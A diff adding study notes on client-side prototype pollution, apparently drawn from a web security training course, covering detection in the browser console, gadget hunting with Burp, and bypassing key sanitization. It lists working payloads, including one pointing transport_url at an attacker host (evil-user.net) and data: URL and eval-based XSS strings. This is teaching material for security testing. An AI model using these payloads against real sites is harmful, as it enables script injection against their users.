@@ -79,3 +79,76 @@ In practice, injecting a property called evilProperty is unlikely to have any ef
     }
 }
 ```
+For example if site uses URL to import JS library, attacker can craft malicious URL to import own JS  
+```
+https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
+```
+By providing a data: URL, an attacker could also directly embed an XSS payload within the query string as follows: 
+```
+https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
+```
+Note that the trailing // in this example is simply to comment out the hardcoded /example.js suffix.  
+## Client-side prototype pollution vulnerabilities
+When testing for client-side vulnerabilities, this involves the following high-level steps:
+* Try to inject an arbitrary property via the query string, URL fragment, and any JSON input. For example:
+`vulnerable-website.com/?__proto__[foo]=bar`
+* In your browser console, inspect Object.prototype to see if you have successfully polluted it with your arbitrary property: 
+```
+Object.prototype.foo
+// "bar" indicates that you have successfully polluted the prototype
+// undefined indicates that the attack was not successful
+``` 
+* If the property was not added to the prototype, try using different techniques, such as switching to dot notation rather than bracket notation, or vice versa:
+```
+vulnerable-website.com/?__proto__.foo=bar
+```
+Once you've identified a source that lets you add arbitrary properties to the global Object.prototype, the next step is to find a suitable gadget that you can use to craft an exploit  
+1. Look through the source code and identify any properties that are used by the application or any libraries that it imports. 
+2. Intercept the response containing the JavaScript that you want to test. 
+3. Add a debugger statement at the start of the script, then forward any remaining requests and responses.
+4. In Burp's browser, go to the page on which the target script is loaded. The debugger statement pauses execution of the script. 
+5. While the script is still paused, switch to the console and enter the following command, replacing YOUR-PROPERTY with one of the properties that you think is a potential gadget:
+```
+Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
+    get() {
+        console.trace();
+        return 'polluted';
+    }
+})
+```
+6. Press the button to continue execution of the script and monitor the console. If a stack trace appears, this confirms that the property was accessed somewhere within the application. 
+7. Expand the stack trace and use the provided link to jump to the line of code where the property is being read. 
+8. Using the browser's debugger controls, step through each phase of execution to see if the property is passed to a sink, such as innerHTML or eval()
+We can make this process easier with `DOM Invader` from Burp's browser  
+  
+Example of attack:
+```
+url/?__proto__[foo]=bar
+```
+Go to console and type `Object.prototype`. If we see foo: bar in properties, prototype was polluted  
+Next we are detecting some object in js file such as `config.transport_url`  
+Next, we are trying to set it's property to anything else:
+```
+/?__proto__[transport_url]=bar
+```
+Next we will check properties of `Object.prototype` in console and detect that `transport_url` property now equals `bar`  
+And after that we are looking for some gadget where our property is reflected (for example sript src)  
+And finally we craft payload to exploit  xss:
+```
+/?__proto__[transport_url]=data:,alert(document.domain);//
+```
+  
+Another example:
+if standard test didn't work, try to sue dot in place of brackets:
+```
+/?__proto__.foo=bar
+```
+Next we can detect sink such as `eval()` function and if there any object's property such as `manager.sequence`, we can try to pollute it:
+```
+/?__proto__.sequence=alert(document.domain)
+```
+If this doesn't work, set a breakpoint at console on the line of code which uses our polluted property and look what's wrong. In our case script added +1 to our script, so we can simply add ` -` to our payload.  
+## Prototype pollution via the constructor
+myObject.constructor.prototype is equivalent to myObject.__proto__, this provides an alternative vector for prototype pollution.  
+## Bypassing flawed key sanitization
+vulnerable-website.com/?__pro__proto__to__.gadget=payload  
